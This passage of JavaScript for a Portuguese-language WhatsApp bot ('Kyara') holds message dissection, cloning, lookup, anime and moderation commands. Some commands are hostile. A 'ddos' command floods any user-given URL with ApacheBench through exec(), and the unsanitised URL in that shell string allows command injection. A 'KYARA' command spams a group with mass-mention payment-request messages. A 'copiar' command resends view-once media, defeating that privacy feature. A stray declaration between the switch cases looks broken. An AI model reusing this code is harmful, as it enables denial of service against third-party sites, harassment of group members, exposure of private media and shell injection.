procurar(valor, alvos, achados, prof + 1);
}
}

return achados;
}

const tipo = Object.keys(citada || {})[0] || "desconhecido";
const stanzaId = ctx?.stanzaId || null;
const autor = (ctx?.participant || "").split("@")[0] || "?";

const original = typeof messagesCache !== "undefined" && stanzaId
? messagesCache.get(stanzaId)
: null;

const camposNotaveis = [
...procurar(citada, [
"externalAdReply",
"mediaKey",
"viewOnceMessage",
"viewOnceMessageV2",
"viewOnceMessageV2Extension",
"viewOnce",
"mentionedJid",
"buttonsMessage",
"interactiveMessage",
"nativeFlowMessage",
"carouselMessage",
"productMessage",
"locationMessage",
"contactMessage",
"pollCreationMessage",
"pollCreationMessageV3",
"forwardingScore",
"quotedMessage",
"disappearingMode",
"contextInfo",
"url",
"directPath",
"mimetype",
"caption"
])
];

const ctxLimpo = { ...ctx };
if (ctxLimpo.quotedMessage) {
ctxLimpo.quotedMessage = '[ver "conteudo_citado" abaixo]';
}

const dump = {
resumo: {
tipo_da_citada: tipo,
enviada_por: autor,
stanzaId,
campos_notaveis: camposNotaveis.length ? camposNotaveis : ["nenhum especial"],
original_no_cache: !!original
},
conteudo_citado: citada,
contextInfo_da_sua_mensagem: ctxLimpo,
mensagem_original_completa: original || "fora do cache ou não capturada"
};

const texto = JSON.stringify(dump, makeReplacer(), 2);

if (texto.length <= 3500) {
await conn.sendMessage(from, {
text: `🔬 *Dissecação da mensagem*\n\n\`\`\`json\n${texto}\n\`\`\``
}, { quoted: info });
} else {
await conn.sendMessage(from, {
document: Buffer.from(texto, "utf-8"),
mimetype: "application/json",
fileName: `dissecar_${tipo}.json`,
caption:
`🔬 *Dissecação completa*

• Tipo: ${tipo}
• Enviada por: ${autor}
• Campos notáveis: ${camposNotaveis.join(", ") || "nenhum"}
• Tamanho: ${texto.length} caracteres`
}, { quoted: info });
}

await reagir(from, "✅");

} catch (e) {
console.log("ERRO DISSECAR:", e);
await reagir(from, "❌");
reply("❌ Não consegui dissecar essa mensagem.\n\nErro: " + (e?.message || e));
}
}
break;

case 'copiar':
case 'clonar':
case 'copy': {
try {
const ctx = info.message?.extendedTextMessage?.contextInfo;
const citada = ctx?.quotedMessage;

if (!citada) {
return reply(`📋 *Copiar*

Responda/marque uma mensagem com:
${prefix + command}

Eu tento clonar texto, imagem, vídeo, áudio, sticker, documento, enquete, contato, localização, botões, listas, carrossel e RICH.`);
}

await reagir(from, "📋");

const stanzaId = ctx?.stanzaId || null;
const fonteCompleta = typeof messagesCache !== "undefined" && stanzaId
? messagesCache.get(stanzaId)
: null;

const baseMsg = fonteCompleta || citada;
const veioDoCache = !!fonteCompleta;

function desembrulhar(m) {
let msg = m;
for (let i = 0; i < 5 && msg; i++) {
if (msg.viewOnceMessageV2?.message) msg = msg.viewOnceMessageV2.message;
else if (msg.viewOnceMessageV2Extension?.message) msg = msg.viewOnceMessageV2Extension.message;
else if (msg.viewOnceMessage?.message) msg = msg.viewOnceMessage.message;
else if (msg.ephemeralMessage?.message) msg = msg.ephemeralMessage.message;
else if (msg.documentWithCaptionMessage?.message) msg = msg.documentWithCaptionMessage.message;
else break;
}
return msg;
}

const msg = desembrulhar(baseMsg);
const tipo = Object.keys(msg || {})[0] || "desconhecido";

const relatorio =
`╭━━〔 📋 CLONADOR 〕━━╮
┃ 🎯 Tipo: ${tipo}
┃ 📡 Fonte: ${veioDoCache ? "cache completa" : "mensagem marcada"}
╰━━━━━━━━━━━━━━━━━━╯`;

async function tentarRelay() {
const mid = crypto.randomBytes(10).toString("hex").toUpperCase();
await conn.relayMessage(from, msg, { messageId: mid });
}

if (
msg.interactiveMessage ||
msg.buttonsMessage ||
msg.templateMessage ||
msg.listMessage ||
msg.productMessage
) {
await reply(relatorio);

try {
await tentarRelay();
await reagir(from, "✅");
break;
} catch (e) {
return reply(`❌ Não consegui clonar esse RICH/interativo em raw.

Erro: ${e.message}`);
}
}

if (msg.imageMessage) {
const o = msg.imageMessage;
const buf = await getFileBuffer(o, "image");

await conn.sendMessage(from, {
image: buf,
caption: o.caption ? `${relatorio}\n\n${o.caption}` : relatorio,
mimetype: o.mimetype || "image/jpeg",
...(o.viewOnce ? { viewOnce: true } : {})
}, { quoted: info });

await reagir(from, "✅");
break;
}

if (msg.videoMessage) {
const o = msg.videoMessage;
const buf = await getFileBuffer(o, "video");

await conn.sendMessage(from, {
video: buf,
caption: o.caption ? `${relatorio}\n\n${o.caption}` : relatorio,
mimetype: o.mimetype || "video/mp4",
gifPlayback: !!o.gifPlayback,
...(o.viewOnce ? { viewOnce: true } : {})
}, { quoted: info });

await reagir(from, "✅");
break;
}

if (msg.audioMessage) {
const o = msg.audioMessage;
const buf = await getFileBuffer(o, "audio");

await reply(relatorio);

await conn.sendMessage(from, {
audio: buf,
mimetype: o.mimetype || "audio/ogg; codecs=opus",
ptt: !!o.ptt
}, { quoted: info });

await reagir(from, "✅");
break;
}

if (msg.stickerMessage) {
const o = msg.stickerMessage;
const buf = await getFileBuffer(o, "sticker");

try {
if (typeof writeExifImg === "function") {
const stickerExif = await writeExifImg(buf, {
packname: "Kyara Copy",
author: "Kyara"
});

const envio = typeof stickerExif === "string"
? { sticker: fs.readFileSync(stickerExif) }
: { sticker: stickerExif };

await conn.sendMessage(from, envio, { quoted: info });

if (typeof stickerExif === "string") {
try { fs.unlinkSync(stickerExif); } catch {}
}
} else {
await conn.sendMessage(from, { sticker: buf }, { quoted: info });
}
} catch {
await conn.sendMessage(from, { sticker: buf }, { quoted: info });
}

await reagir(from, "✅");
break;
}

if (msg.documentMessage) {
const o = msg.documentMessage;
const buf = await getFileBuffer(o, "document");

await conn.sendMessage(from, {
document: buf,
mimetype: o.mimetype || "application/octet-stream",
fileName: o.fileName || "arquivo",
caption: o.caption ? `${relatorio}\n\n${o.caption}` : relatorio
}, { quoted: info });

await reagir(from, "✅");
break;
}

if (msg.pollCreationMessage || msg.pollCreationMessageV3) {
const o = msg.pollCreationMessageV3 || msg.pollCreationMessage;
const opcoes = (o.options || []).map(op => op.optionName).filter(Boolean);

await reply(relatorio);

await conn.sendMessage(from, {
poll: {
name: o.name || "Enquete",
values: opcoes.length ? opcoes : ["Opção 1", "Opção 2"],
selectableCount: o.selectableOptionsCount || 1
}
}, { quoted: info });

await reagir(from, "✅");
break;
}

if (msg.locationMessage) {
const o = msg.locationMessage;

await reply(relatorio);

await conn.sendMessage(from, {
location: {
degreesLatitude: o.degreesLatitude,
degreesLongitude: o.degreesLongitude
}
}, { quoted: info });

await reagir(from, "✅");
break;
}

if (msg.contactMessage) {
const o = msg.contactMessage;

await reply(relatorio);

await conn.sendMessage(from, {
contacts: {
displayName: o.displayName || "Contato",
contacts: [{ vcard: o.vcard }]
}
}, { quoted: info });

await reagir(from, "✅");
break;
}

const texto = msg.conversation || msg.extendedTextMessage?.text;

if (texto) {
const ctxCitado = msg.extendedTextMessage?.contextInfo || {};

const payload = {
text: `${relatorio}\n\n${texto}`
};

if (ctxCitado.externalAdReply) {
payload.contextInfo = {
externalAdReply: ctxCitado.externalAdReply
};
}

if (Array.isArray(ctxCitado.mentionedJid) && ctxCitado.mentionedJid.length) {
payload.mentions = ctxCitado.mentionedJid;
}

await conn.sendMessage(from, payload, { quoted: info });

await reagir(from, "✅");
break;
}

try {
await reply(relatorio);
await tentarRelay();
await reagir(from, "✅");
} catch (e) {
await reagir(from, "❌");
reply(`❌ Não consegui clonar esse tipo: *${tipo}*

Use ${prefix}dissecar respondendo essa mensagem pra ver a estrutura.`);
}

} catch (e) {
console.log("ERRO COPIAR:", e);
await reagir(from, "❌");
reply("❌ Não consegui copiar essa mensagem.\n\nErro: " + (e?.message || e));
}
}
break;

const vm = require("vm");

case "teste": {
try {
if (!So_Dono) return reply(msg.SoDono);

if (!q) return reply("Digite um código.");

const sandbox = {
conn: {
sendMessage: (...args) => conn.sendMessage(...args),
sendRich: (...args) => conn.sendRich(...args),
makeText: (...args) => conn.makeText(...args),
makeCode: (...args) => conn.makeCode(...args),
makeTable: (...args) => conn.makeTable(...args),
sendImage: (...args) => conn.sendImage(...args),
sendVideo: (...args) => conn.sendVideo(...args),
sendAudio: (...args) => conn.sendAudio(...args)
},
from,
info,
sender,
reply,
reagir,
console,
Buffer,
setTimeout,
clearTimeout
};

const codigo = `(async () => {
${q}
})()`;

await vm.runInNewContext(codigo, sandbox, {
timeout: 5000
});

} catch (e) {
reply("❌ " + e.message);
}
}
break;

case 'systemzero':
case 'josue': {
try {
await conn.sendMessage(from, { react: { text: "📚", key: info.key } });

await conn.sendRich(from, [

conn.makeText(
`# 📚 @systemzero/baileys

Fork/modificação do Baileys para criar bots WhatsApp em Node.js.

Baileys usa conexão WebSocket com o WhatsApp Web, sem navegador/Selenium.`
),

conn.makeCode("bash",
`npm install @systemzero/baileys

npm install pino @hapi/boom qrcode-terminal axios`
),

conn.makeTable([
["Recurso", "Descrição"],
["Conexão", "Conecta no WhatsApp Web"],
["Auth", "Salva sessão em arquivos"],
["Mensagens", "Texto, imagem, vídeo, áudio"],
["Grupos", "Administração e participantes"],
["RICH", "Texto, código e tabela"],
["Eventos", "messages.upsert, creds.update"]
]),

conn.makeText(
`## 🚀 Conexão básica`
),

conn.makeCode("javascript",
`const {
default: makeWASocket,
useMultiFileAuthState,
DisconnectReason
} = require("@systemzero/baileys");

const pino = require("pino");

async function startBot() {
const { state, saveCreds } = await useMultiFileAuthState("./sessao");

const conn = makeWASocket({
auth: state,
logger: pino({ level: "silent" }),
printQRInTerminal: true
});

conn.ev.on("creds.update", saveCreds);

conn.ev.on("messages.upsert", async ({ messages }) => {
const info = messages[0];
if (!info.message) return;

const from = info.key.remoteJid;

await conn.sendMessage(from, {
text: "✅ Bot online!"
});
});
}

startBot();`
),

conn.makeText(
`## 💬 Enviar mensagens`
),

conn.makeCode("javascript",
`// Texto
await conn.sendMessage(from, {
text: "Olá mundo!"
}, { quoted: info });

// Imagem
await conn.sendMessage(from, {
image: { url: "https://exemplo.com/foto.jpg" },
caption: "Imagem enviada"
}, { quoted: info });

// Áudio
await conn.sendMessage(from, {
audio: { url: "https://exemplo.com/audio.mp3" },
mimetype: "audio/mpeg",
ptt: false
}, { quoted: info });`
),

conn.makeText(
`## 🧠 RICH RESPONSE`
),

conn.makeCode("javascript",
`await conn.sendRich(from, [

conn.makeText(
"# Título\\n\\nTexto com **negrito** e [link](https://github.com)"
),

conn.makeCode("javascript",
"console.log('Kyara')"
),

conn.makeTable([
["Sistema", "Status"],
["IA", "✅ Online"],
["API", "✅ Online"]
])

], info, [
"RICH_RESPONSE_CODE",
"RICH_RESPONSE_TABLE"
]);`
),

conn.makeText(
`## 👥 Grupos`
),

conn.makeCode("javascript",
`// Pegar metadata do grupo
const metadata = await conn.groupMetadata(from);

// Participantes
const membros = metadata.participants;

// Promover adm
await conn.groupParticipantsUpdate(from, [user], "promote");

// Rebaixar adm
await conn.groupParticipantsUpdate(from, [user], "demote");

// Remover membro
await conn.groupParticipantsUpdate(from, [user], "remove");

// Adicionar membro
await conn.groupParticipantsUpdate(from, [numero + "@s.whatsapp.net"], "add");`
),

conn.makeText(
`## 📌 Eventos importantes`
),

conn.makeTable([
["Evento", "Uso"],
["messages.upsert", "Receber mensagens"],
["creds.update", "Salvar sessão"],
["connection.update", "Detectar conexão"],
["group-participants.update", "Entrada/saída de membros"],
["contacts.update", "Atualização de contatos"]
]),

conn.makeText(
`## 🔗 Links úteis

• [📦 NPM](https://www.npmjs.com/package/@systemzero/baileys)
• [📚 Docs Baileys](https://baileys.wiki/docs/intro)
• [💻 GitHub Baileys](https://github.com/WhiskeySockets/Baileys)`
)

], info, [
"RICH_RESPONSE_CODE",
"RICH_RESPONSE_TABLE"
]);

await conn.sendMessage(from, { react: { text: "✅", key: info.key } });

} catch (e) {
console.log(e);
reply("❌ Erro ao enviar documentação.");
}
}
break;

case 'formula':
case 'formulaz': {
try {
if (!q?.trim()) {
return reply(`🧮 *Exemplo:*\n${prefix + command} velocidade média\n${prefix + command} bhaskara\n${prefix + command} água`);
}

await conn.sendMessage(from, { react: { text: "🔎", key: info.key } });

const GROQ_API_KEY = process.env.GROQ_API_KEY || "API_KEY_GROK";

const pergunta = q.trim();

const prompt = `
Você é especialista em matemática, física, química e engenharia.

Pedido do usuário: "${pergunta}"

Retorne SOMENTE JSON válido:
{
  "titulo": "",
  "area": "",
  "formula_latex": "",
  "explicacao": "",
  "variaveis": [["Símbolo","Significado"]],
  "exemplo": "",
  "aplicacoes": "",
  "curiosidade": "",
  "observacao": ""
}

REGRAS:
- Responda em português do Brasil.
- Não use markdown fora do JSON.
- exemplo deve começar direto com o cálculo, sem frases como "um exemplo de cálculo é".
- Não use caracteres soltos no início, como "m", "xt", "-", ":".
- formula_latex deve ser uma fórmula correta e útil sobre o pedido.
- Se for matemática/física, retorne a fórmula principal.
- Se for química, retorne uma representação química correta ou cálculo útil.
- Para "água", prefira: M(H_2O)=2M(H)+M(O), não invente reação.
- Para "ferro", prefira massa molar, densidade ou oxidação.
- Não coloque texto perdido tipo "xt".
- exemplo deve ser limpo, curto e resolvido.
`;

const { data } = await axios.post(
"https://api.groq.com/openai/v1/chat/completions",
{
model: "llama-3.3-70b-versatile",
messages: [
{
role: "system",
content: "Responda somente JSON válido. Sem markdown. Sem texto fora do JSON."
},
{
role: "user",
content: prompt
}
],
temperature: 0.1
},
{
headers: {
Authorization: `Bearer ${GROQ_API_KEY}`,
"Content-Type": "application/json"
},
timeout: 30000
}
);

let resposta = data?.choices?.[0]?.message?.content || "";

resposta = resposta
.replace(/```json/gi, "")
.replace(/```/g, "")
.trim();

const inicio = resposta.indexOf("{");
const fim = resposta.lastIndexOf("}");

if (inicio === -1 || fim === -1) throw new Error("JSON não encontrado");

resposta = resposta.slice(inicio, fim + 1);

let json;
try {
json = JSON.parse(resposta);
} catch {
console.log("JSON QUEBRADO:", resposta);
throw new Error("JSON inválido");
}

const titulo = json.titulo || "Fórmula encontrada";
const area = json.area || "Geral";
const latex = json.formula_latex || "Não encontrada";
const explicacao = json.explicacao || "Sem explicação.";
const exemplo = json.exemplo || "Sem exemplo.";
const aplicacoes = json.aplicacoes || "Não informado.";
const curiosidade = json.curiosidade || "Não informado.";
const observacao = json.observacao || "Verifique sempre com seu professor ou material didático.";

let tabela = Array.isArray(json.variaveis) ? json.variaveis : [
["Símbolo", "Significado"],
["?", String(json.variaveis || "Não informado")]
];

if (!Array.isArray(tabela[0])) {
tabela = [
["Símbolo", "Significado"],
["?", String(json.variaveis || "Não informado")]
];
}

const todaMateria = `https://www.todamateria.com.br/?s=${encodeURIComponent(pergunta)}`;

await conn.sendRich(from, [

conn.makeText(
`# 🧮 KYARA SCIENCES

Olá ${pushname}!!

🔎 Pedido: *${pergunta}*
📚 Área: *${area}*

## 📌 ${titulo}

📘 Explicação:
${explicacao}`
),

conn.makeCode("Fórmula", latex),

conn.makeTable(tabela),

conn.makeText(
`## 🧪 Exemplo

\`\`\`
${exemplo}
\`\`\`

## 📍 Aplicações

${aplicacoes}

## 🧠 Curiosidade

${curiosidade}

## ⚠️ Observação

${observacao}

## 🌐 Saiba mais

• [📚 Toda Matéria - ${pergunta}](${todaMateria})`
)

], info, [
"RICH_RESPONSE_CODE",
"RICH_RESPONSE_TABLE"
]);

await conn.sendMessage(from, { react: { text: "✅", key: info.key } });

} catch (e) {
console.log("ERRO FORMULA:", e?.response?.data || e);
await conn.sendMessage(from, { react: { text: "❌", key: info.key } });
reply("❌ Erro ao pesquisar fórmula.");
}
}
break;

case 'gitsearch':
case 'github':
case 'repos': {
try {
if (!q) {
return reply(`🔎 *Exemplo de uso:*\n${prefix + command} Kyara`);
}

await reagir(from, "🔎");

const {
generateWAMessageFromContent,
proto
} = require("@systemzero/baileys");

const { data } = await axios.get(
"https://api.github.com/search/repositories",
{
params: {
q: q,
sort: "stars",
order: "desc",
per_page: 10
},
headers: {
"User-Agent": "Kyara"
}
}
);

if (!data.items.length) {
await reagir(from, "❌");
return reply("❌ Nenhum repositório encontrado.");
}

const rows = data.items.map(repo => ({
header: `⭐ ${repo.stargazers_count} • 🍴 ${repo.forks_count}`,
title: repo.full_name,
description: (repo.description || "Sem descrição").slice(0, 72),
id: `${prefix}repo ${repo.full_name}`
}));

const msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
interactiveMessage: proto.Message.InteractiveMessage.create({
body: {
text: `📚 *Resultados para:* ${q}\n\nSelecione um repositório abaixo.`
},
footer: {
text: "Kyara • GitHub Search"
},
header: {
hasMediaAttachment: false
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "📂 Abrir resultados",
sections: [{
title: "Repositórios encontrados",
rows
}]
})
}]
}
})
}
}
}, {});

await conn.relayMessage(
from,
msg.message,
{
messageId: msg.key.id
}
);

await reagir(from, "✅");

} catch (e) {
console.log(e.response?.data || e);
await reagir(from, "❌");
reply("❌ Erro ao pesquisar repositórios.");
}
}
break;

case 'repo': {
try {

if (!q) return reply("Informe o repositório.");

await reagir(from, "⏳");

// CORRIGE A BARRA ESCAPADA DA LISTA
let repoName = q
.replace(/\\\//g, "/")
.replace(/\s+/g, "")
.trim();

const { data } = await axios.get(
`https://api.github.com/repos/${repoName}`,
{
headers: {
"User-Agent": "Kyara"
}
}
);

await conn.sendMessage(from, {
text:
`📦 *${data.full_name}*

📝 ${data.description || "Sem descrição"}

👤 Autor: ${data.owner.login}
⭐ Estrelas: ${data.stargazers_count}
🍴 Forks: ${data.forks_count}
👀 Watchers: ${data.watchers_count}
🐞 Issues: ${data.open_issues_count}
💻 Linguagem: ${data.language || "Não informada"}

🔗 ${data.html_url}`
}, { quoted: info });

await reagir(from, "✅");

} catch (e) {
console.log(e.response?.data || e);
await reagir(from, "❌");
reply("❌ Repositório não encontrado.");
}
}
break;

case 'cotacao': {
try {

const moeda = (args[0] || 'USD-BRL').toUpperCase();

if (!moeda.includes('-')) {
return reply(`💱 Use:\n${prefix}cotacao USD-BRL\n\nEx: ${prefix}cotacao EUR-BRL`);
}

const { data } = await axios.get(`https://economia.awesomeapi.com.br/json/last/${moeda}`);

const key = moeda.replace('-', '');
const info = data[key];

if (!info) return reply('❌ Cotação não encontrada.');

reply(`
💱 *COTAÇÃO DE MOEDA*

🔹 Moeda: ${info.name}
💰 Compra: R$ ${Number(info.bid).toFixed(2)}
📈 Máxima: R$ ${Number(info.high).toFixed(2)}
📉 Mínima: R$ ${Number(info.low).toFixed(2)}
📊 Variação: ${info.pctChange}%

🕒 Atualizado: ${info.create_date}

🤖 Kyara AI
`.trim());

} catch (e) {
console.error(e);
reply('❌ Erro ao consultar cotação.');
}
}
break;

case 'ip': {
try {

const ip = args[0];

if (!ip) {
return reply(`🌐 Use:\n${prefix}ip 8.8.8.8`);
}

const { data } = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,isp,org,as,query,timezone`);

if (data.status !== 'success') {
return reply('❌ IP não encontrado.');
}

reply(`
🌐 *CONSULTA DE IP*

📍 IP: ${data.query}
🏳️ País: ${data.country}
🗺️ Estado: ${data.regionName}
🏙️ Cidade: ${data.city}
📮 CEP: ${data.zip || 'Não informado'}
🌎 Fuso: ${data.timezone}

📡 ISP: ${data.isp}
🏢 Organização: ${data.org}
🔗 ASN: ${data.as}

🤖 Kyara AI
`.trim());

} catch (e) {
console.error(e);
reply('❌ Erro ao consultar o IP.');
}
}
break;

case 'cep': {
try {

const cep = args[0]?.replace(/\D/g, '');

if (!cep) {
return reply(`📍 Use:\n${prefix}cep 01001000`);
}

if (cep.length !== 8) {
return reply('❌ CEP inválido.');
}

const { data } = await axios.get(`https://viacep.com.br/ws/${cep}/json/`);

if (data.erro) {
return reply('❌ CEP não encontrado.');
}

reply(`
📍 *CONSULTA DE CEP*

🔎 CEP: ${data.cep}
🛣️ Logradouro: ${data.logradouro || 'Não informado'}
🏘️ Bairro: ${data.bairro || 'Não informado'}
🏙️ Cidade: ${data.localidade}
🌎 Estado: ${data.uf}
🗺️ Região: ${data.regiao || 'Não informado'}
🏠 Complemento: ${data.complemento || 'Nenhum'}

🤖 Kyara AI
`.trim());

} catch (e) {
console.error(e);
reply('❌ Erro ao consultar o CEP.');
}
}
break;

case 'ddos': {
try {

const url = args[0];
const total = parseInt(args[1]) || 100;
const concorrencia = parseInt(args[2]) || 10;

if (!url) {
return reply(`Use:\n${prefix}testesite https://site.com 100 10`);
}

// Limites de segurança
if (total > 5000) return reply('❌ Máximo: 5000 requisições');
if (concorrencia > 100) return reply('❌ Máximo: 100 conexões simultâneas');

reply(`⏳ Testando...\n🌐 URL: ${url}\n📦 Requisições: ${total}\n⚡ Concorrência: ${concorrencia}`);

exec(`ab -n ${total} -c ${concorrencia} "${url}"`, (err, stdout) => {
if (err) {
console.error(err);
return reply('❌ Erro ao executar o ApacheBench.');
}

const resultado = stdout
.split('\n')
.filter(l =>
l.includes('Requests per second') ||
l.includes('Time per request') ||
l.includes('Failed requests') ||
l.includes('Complete requests')
)
.join('\n');

reply(`📊 Resultado:\n\n${resultado}`);
});

} catch (e) {
console.error(e);
reply('❌ Erro no teste.');
}
}
break;

case 'KYARA': {

    if (!isGroup) return enviar("Este comando só pode ser usado em grupos.");
    const texto = `KYARA DOMINA!!!!`.trim();
    const delay = ms => new Promise(res => setTimeout(res, ms));
    try {  
        const metadata = await conn.groupMetadata(from);  
        const participantes = metadata.participants.map(p => p.id);  
        for (let i = 0; i < 10; i++) {
            await conn.relayMessage(from, {  
                requestPaymentMessage: {  
                    currencyCodeIso4217: "BRL",  
                    amount1000: "99999999999",  
                    requestFrom: sender,  
                    noteMessage: {  
                        extendedTextMessage: {  
                            text: texto,  
                            contextInfo: { mentionedJid: participantes }  
                        }  
                    },
                    expiryTimestamp: "0"  
                }  
            }, {});

            await delay(500);

            await conn.relayMessage(from, {
                groupStatusMessageV2: {
                    message: {
                        requestPaymentMessage: {
                            currencyCodeIso4217: "BRL",
                            amount1000: "9999999",
                            requestFrom: sender,
                            noteMessage: {
                                extendedTextMessage: {
                                    text: texto,
                                    contextInfo: { 
                                        mentionedJid: participantes,
                                        isGroupStatus: true,
                                        statusSourceType: "IMAGE",
                                        statusAttributions: [{
                                            type: "GROUP_STATUS",
                                            groupStatus: { authorJid: sender }
                                        }]
                                    }
                                }
                            },
                            expiryTimestamp: "0"
                        }
                    }
                }
            }, {});
            
            await delay(500);
        }

    } catch (e) {  
        console.error(`Deu erro chefe`, e);  
    }
}
break;

// ===== ANIME COM LISTA =====
case 'anime': {
try {
if (!q) return reply(`
╭━━━〔 🤖 KYARA STREAM 〕━━━╮

🎌 MODO ANIME ATIVADO

▢ COMANDO:
${prefix}anime <nome>

▢ EXEMPLO:
${prefix}anime Naruto

╭─────────────────╮
│ STATUS: ONLINE ✅
│ API: CONECTADA ⚡
│ BUSCA: DISPONÍVEL 🔎
╰─────────────────╯

❤️‍🔥 Kyara & Kyara-AI

╰━━━━━━━━━━━━━━━━━━━━╯`);

await reagir(from, "🔎");

const { prepareWAMessageMedia, generateWAMessageFromContent } = require("@systemzero/baileys");

const { data } = await axios.get("https://zone.api.br/api/anime/search", {
params: { q }
});

if (!data?.status || !data?.result) return reply("❌ Anime não encontrado.");

const res = data.result;
const episodios = (res.episodios || []).filter(e => Array.isArray(e.players) && e.players.length > 0);

if (!episodios.length) return reply("❌ Nenhum episódio disponível.");

global.animeCache = global.animeCache || new Map();
global.animeCache.set(sender, { anime: res.anime, episodios });

let imageMessage = null;
try {
const prepared = await prepareWAMessageMedia(
{ image: { url: Config?.fotoBot || './dono/menus/Foto-menu/img-menu.jpg' } },
{ upload: conn.waUploadToServer }
);
imageMessage = prepared.imageMessage;
} catch {}

const sections = [];

for (let i = 0; i < Math.min(episodios.length, 100); i += 20) {
const chunk = episodios.slice(i, i + 20);

sections.push({
title: `EPISÓDIOS ${i + 1}–${i + chunk.length}`,
rows: chunk.map((ep, j) => ({
header: `Episódio ${i + j + 1}`,
title: ep.titulo || `Episódio ${i + j + 1}`,
description: "Dublado • Clique para assistir",
id: `${prefix}animeep ${i + j}`
}))
});
}

const texto = `
╭━━━〔 🤖 KYARA STREAM 〕━━━╮

🎌 ANIME ENCONTRADO

▢ 🎬 Título:
${res.anime}

▢ 📺 Episódios:
${episodios.length}

▢ 🗣️ Idioma:
Dublado

╭─────────────────╮
│ STATUS: ONLINE ✅
│ BANCO: CONECTADO ⚡
│ EPISÓDIOS: PRONTOS 📚
╰─────────────────╯

📋 Escolha um episódio na lista.

❤️‍🔥 Kyara & Kyara-AI
╰━━━━━━━━━━━━━━━━━━━━╯`;

const msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: !!imageMessage,
imageMessage
},
body: { text: texto },
footer: { text: "Kyara ❤️‍🔥" },
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
bottom_sheet: {
button_title: "Ver Episódios",
list_title: "Episódios Encontrados"
}
}),
buttons: [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Selecionar Episódio",
sections
})
}]
}
}
}
}
}, { quoted: selo });

await conn.relayMessage(from, msg.message, { messageId: msg.key.id });

} catch (e) {
console.log("[ANIME ERROR]", e);
await reagir(from, "❌");
reply(`❌ Erro ao buscar anime:\n${e.message}`);
}
}
break;

case 'animeep': {
try {
global.animeCache = global.animeCache || new Map();

const cache = global.animeCache.get(sender);
if (!cache) return reply(`❌ Pesquise primeiro:\n*${prefix}anime Naruto*`);

const index = Number(q.trim());
if (isNaN(index)) return reply("❌ Episódio inválido.");

const ep = cache.episodios[index];
if (!ep) return reply("❌ Episódio não encontrado.");

const link = ep.players[0];

await reagir(from, "⏳");

let imageMessage = null;
try {
const prepared = await prepareWAMessageMedia(
{ image: { url: Config?.fotoBot || './dono/menus/Foto-menu/img-menu.jpg' } },
{ upload: conn.waUploadToServer }
);
imageMessage = prepared.imageMessage;
} catch {}

const texto = `
╭━━━〔 🤖 KYARA STREAM 〕━━━╮

🎌 ANIME DETECTADO

▢ 🎬 Título:
${cache.anime}

▢ 📺 Episódio:
${index + 1}

▢ 🗣️ Áudio:
Dublado

╭─────────────────╮
│ STATUS: ONLINE ✅
│ SERVIDOR: KYARA ⚡
│ STREAM: PRONTO 🎥
╰─────────────────╯

❤️‍🔥 Kyara & Kyara-AI
╰━━━━━━━━━━━━━━━━━━━━╯`;

const msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: !!imageMessage,
imageMessage
},
body: { text: texto },
footer: { text: "Kyara ❤️‍🔥" },
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "▶ Assistir Episódio",
url: link,
merchant_url: link
})
}]
}
}
}
}
}, { quoted: selo });

await conn.relayMessage(from, msg.message, { messageId: msg.key.id });
await reagir(from, "✅");

} catch (e) {
console.log("[ANIMEEP ERROR]", e);
await reagir(from, "❌");
reply(`❌ Erro ao carregar episódio:\n${e.message}`);
}
}
break;

//COMANDOS DE ADMIN'S!!
case 'antistatus': {
  try {
if (!isGroup) return reply("Só em grupo.");
if (!isGroupAdmins) return reply(msg.SoAdmin);
    if (dataGp[0].antistatus === undefined) dataGp[0].antistatus = false;
    dataGp[0].antistatus = !dataGp[0].antistatus;
    const novoEstado = dataGp[0].antistatus;
    setGp(dataGp);

    const msg = novoEstado
      ? '_Anti-Status *ativado* neste grupo tlgd?. Todos os status enviados aqui serão deletados automaticamente._'
      : '_Anti-Status *desativado* neste grupo._';
    await reply(msg);
  } catch (e) {
    console.error('[ERRO ANTISTATUS CMD]', e);
    reply('_Erro ao alternar o Anti-Status._');
  }
}
break;

case 'promover': {
if (!isGroup) return reply("Só em grupo desgraça.");
if (!isGroupAdmins) return reply(msg.SoAdmin);

const res = await promoverUser(conn, from, info, q, botNumber, NumberDono);

if (res.erro) return reply(res.erro);

await conn.sendMessage(from, {
  text: res.sucesso,
  mentions: [res.alvo]
});

}
break;

case 'rebaixar': {
if (!isGroup) return reply("Só em grupo desgraça.");
if (!isGroupAdmins) return reply(msg.SoAdmin);

const res = await rebaixarUser(conn, from, info, q, botNumber, NumberDono);

if (res.erro) return reply(res.erro);

await conn.sendMessage(from, {
  text: res.sucesso,
  mentions: [res.alvo]
});

}
break;

case 'ban':
case 'banir':
case 'kick':
case 'avadakedavra': {
    try {
        if (!isGroup) return reply("❌ APENAS EM GRUPOS CARALHO.");

        const executorJid = info.key.participantAlt || info.key.participant || info.key.remoteJid || sender;
        const executorJidNormalizado = jidNormalizedUser(executorJid);

        const verificar = await sistemaVerificacao(conn, from, executorJidNormalizado, { numerodono: NumberDono }, botNumber);

        if (!verificar.isSenderAdmin && !verificar.isDonoBot) return reply("❌ Apenas administradores desgraça.");
        if (!verificar.isBotAdmin) return reply("❌ O Kyara precisa ser admin dessa porra.");

        const contextInfo = info?.message?.extendedTextMessage?.contextInfo || info?.msg?.contextInfo || info?.contextInfo || {};
        let alvo = null;

        if (Array.isArray(contextInfo.mentionedJid) && contextInfo.mentionedJid.length > 0) {
            alvo = contextInfo.mentionedJid[0];
        } else if (contextInfo.participant) {
            alvo = contextInfo.participant;
        } else if (info?.quoted?.sender) {
            alvo = info.quoted.sender;
        } else if (q) {
            const numero = q.replace(/\D/g, '');
            if (numero.length >= 5) alvo = numero;
        }

        if (!alvo) return reply("❌ Marque, responda ou envie a porra do  número.");

        const membro = verificar.buscarMembro(alvo);
        if (!membro) return reply("❌ Usuário não foi encontrado.");

        const alvoId = verificar.getId(membro);
        const alvoNumero = verificar.getNumero(membro);
        const alvoAdmin = verificar.isAdmin(membro);
        const alvoDono = verificar.isDono(membro);
        const executorNumero = verificar.getNumero({ id: executorJidNormalizado });
